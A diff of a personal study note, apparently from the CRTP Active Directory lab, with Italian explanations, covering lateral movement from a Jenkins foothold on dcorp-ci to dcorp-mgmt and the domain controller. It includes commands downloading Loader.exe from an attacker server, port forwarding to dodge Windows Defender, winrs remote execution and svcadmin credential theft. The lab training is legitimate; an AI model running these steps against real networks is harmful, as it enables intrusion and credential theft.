@@ -1,4 +1,4 @@
-1. Identify a machine in the target domain where a Domain Admin sessio in available.
+1. Identify a machine in the target domain where a Domain Admin session in available.
 2. Compromise the machine and escalate privileges to Domain Admin by abusing reverse shell on dcorp-ci
 3. Escalate to Domain Admin by abusing derivative local admin through dcorp-adminsrv. On dcorp-adminsrv tackle application allowlist using
 	1. Gasps in Applocker rules
@@ -8,6 +8,10 @@
  >1. Identify a machine with a Domain Admin session.
 > 2. Investigate the escalation path from `dcorp-ci` to `dcorp-mgmt` and `dcorp-dc`.
  >3. Investigate the separate `dcorp-adminsrv` path: AppLocker rule gaps and GPO permissions.
+ 
+ >[!IMPORTANT]
+ >SEE AT THE END. THIS PATH FROM `dcorp-ci` to `dcorp-mgmt` IS EASIER BECAUSE THE SESSION GOT WITH JENKINS IS FOR A USER THAT HAS THE ACCESS TO `dcorp-mgmt`
+ 
 ## 1. Prepare the PowerShell environment
 
 The lab begins with InviShell and PowerView.
@@ -41,7 +45,6 @@ Find-DomainUserLocation -Verbose
 
 > [!NOTE] Spiegazione in italiano
 > Cerchiamo i computer sui quali risultano sessioni di utenti privilegiati. È utile perché un amministratore di dominio può aver effettuato l'accesso a un server diverso dal Domain Controller. Tuttavia, sapere che la sessione esiste non significa poter amministrare quel server o recuperare credenziali: sono verifiche distinte.
-
   
 
 ## 3. Existing foothold on `dcorp-ci`
@@ -93,11 +96,12 @@ After the PowerView functions are available in the session in `dcorp-ci`, contin
 ```powershell
 Find-DomainUserLocation
 ```
-- This helps correlate privileged users and their sessions with computers in the domain. The next section explains how to interpret the results.
+- This help**s correlate privileged users and their sessions with computers in the domain**. The next section explains how to interpret the results.
 	- ![[Pasted image 20261120110137.png|642]]
 - We know that we can run `Find-DomainUserLocation` on a macine only if we have administartor privilege on it. And we can see in the results `ComputerName    : dcorp-mgmt.dollarcorp.moneycorp.local`
 	- ![[Pasted image 20261120110330.png]]
-  
+
+
 
 > [!NOTE] Perché questo passaggio è importante?
 > Ora possiamo interrogare il dominio dal contesto disponibile su `dcorp-ci`. 
@@ -130,13 +134,13 @@ We use this command to put the `loader.exe` on the `dcorp-ci` machine:
 iwr http://172.16.100.55/Loader.exe -OutFile C:\Users\Public\Loader.exe
 ```
 - ![[Pasted image 20261120111837.png]]
-- **Command explanation:** `iwr` is an alias for `Invoke-WebRequest`; the URL identifies the HTTP resource and `-OutFile` specifies the destination file. `C:\Users\Public\` is the local destination **on `dcorp-ci`** when this command runs there.
+- `iwr` is an alias for `Invoke-WebRequest`; 
+- the URL identifies the HTTP resource and `-OutFile` specifies the destination file.
+- `C:\Users\Public\` is the local destination **on `dcorp-ci`** when this command runs there.
 
-  
 
 > [!NOTE] Spiegazione in italiano
 > Questo comando effettua una richiesta HTTP al server HFS e salva il file su `dcorp-ci`. L'opzione `-OutFile` è importante: senza di essa, `Invoke-WebRequest` non salverebbe automaticamente il contenuto in quel percorso.
-
   
 ### 6.3 Copy the loader from `dcorp-ci` to `dcorp-mgmt`
 Now we have to pass the loader on `dcorp-mgmt`. We can do it from `dcorp-ci`:
@@ -191,8 +195,6 @@ Connection to 127.0.0.1:8080 on dcorp-mgmt
 > `0.0.0.0` significa che l'ascolto non è limitato a `127.0.0.1`; il programma può comunque collegarsi tramite loopback. 
 > L'idea è **setto un TCP forwarding in modo da trasformare le richieste a 127.0.0.1 : 8080 in richieste verso 172.16.100.55:80**, così windows defender non blocca l'esecuzione.
 
-
-  
 
 ### 6.6 Original localhost-based invocation and evidence
 
@@ -334,7 +336,6 @@ winrs -r:dcorp-dc cmd /c set username
 > `cmd /c set username` esegue un comando e termina. 
 > Se riceviamo una risposta, abbiamo dimostrato l'esecuzione remota con il contesto accettato dal servizio. Questo però non basta, da solo, per dichiarare formalmente che l'account appartiene al gruppo **Domain Admins**.
 
-
 ### 9.2 Open a remote command shell on `dcorp-dc`
 
 Now we can try to popup a shell directly on the domain controller `dcorp-dc`. If `svcadmin` has privileges on the `domain controller` we can use:
@@ -379,3 +380,86 @@ GPO ACLs | Policy modification rights are an authorization boundary. |
 
   
 ![[Flusso del laboratorio CRTP_ dal foothold al Domain Controller.png|700]]
+
+
+# Understanding the Attack Path: From `dcorp-ci` to `dcorp-mgmt`
+
+## Understanding the attack path: From `dcorp-ci` to `dcorp-mgmt`
+In this attack path, we already have a shell on `dcorp-ci` obtained through Jenkins.
+
+Our objective is to leverage the security context available on `dcorp-ci` to gain remote access to `dcorp-mgmt`.
+
+The attack follows these steps:
+1. **Initial foothold:** We have a shell on `dcorp-ci` through Jenkins.
+2. **Session enumeration:** We use `Find-DomainUserLocation` to identify machines where privileged domain users have active sessions. We discover `dcorp-mgmt`.
+3. **Remote access validation:** We use `winrs` from `dcorp-ci` to check whether our current security context allows remote command execution on `dcorp-mgmt`.
+4. **Access to dcorp-mgmt:** The successful WinRS execution confirms that we can execute commands remotely on the target.
+5. **Credential exposure:** Once we have access to `dcorp-mgmt`, we investigate authentication material associated with privileged accounts, eventually identifying `svcadmin`.
+6. **Further escalation:** The lab then explores Kerberos authentication using `svcadmin` to reach `dcorp-dc`.
+
+  
+
+### Key commands for discovery and access validation
+
+```powershell
+# Identify hosts with privileged sessions (discovery only)
+
+Find-DomainUserLocation
+
+# Check remote execution on dcorp-mgmt from the dcorp-ci context
+winrs -r:dcorp-mgmt cmd /c "set computername && set username"
+```
+
+  
+
+> [!IMPORTANT] Key concept — Lateral Movement
+> We are not using `Find-DomainUserLocation` to gain access directly. We use it to identify an interesting target.
+> 
+> The actual lateral movement from `dcorp-ci` to `dcorp-mgmt` happens through **WinRS**, using the security context available on `dcorp-ci`.
+>
+
+
+  
+
+> [!NOTE] 
+> In questo caso, a differenza del percorso tramite `dcorp-adminsrv`, **non recuperiamo prima le credenziali di `srvadmin`**.
+> 
+> Abbiamo già compromesso `dcorp-ci` attraverso Jenkins e vogliamo capire se possiamo sfruttare i privilegi dell'identità con cui stiamo eseguendo i comandi per accedere a un altro server.
+>
+> Utilizziamo `Find-DomainUserLocation` per individuare le macchine dove sono presenti sessioni privilegiate. Tra queste troviamo `dcorp-mgmt`.
+> 
+> Successivamente, tramite `winrs`, verifichiamo se il contesto di sicurezza disponibile su `dcorp-ci` ci permette di eseguire comandi su `dcorp-mgmt`.
+
+  
+## Attack flow — Quick reference
+
+
+```text
+Student workstation
+        │
+        ▼
+    Jenkins foothold
+        │
+        ▼
+      dcorp-ci (in this case can connect directly to dcorp-mgmt)
+        │
+        ├── Find-DomainUserLocation
+        │         └── Finds interesting host: dcorp-mgmt
+        │
+        └── WinRS access check
+                  └── Validates remote command execution
+                           │
+                           ▼
+                        dcorp-mgmt
+                           │
+                           ▼
+                Authentication material
+                     (svcadmin)
+                           │
+                           ▼
+                 Kerberos authentication
+                           │
+                           ▼
+                        dcorp-dc
+```
+
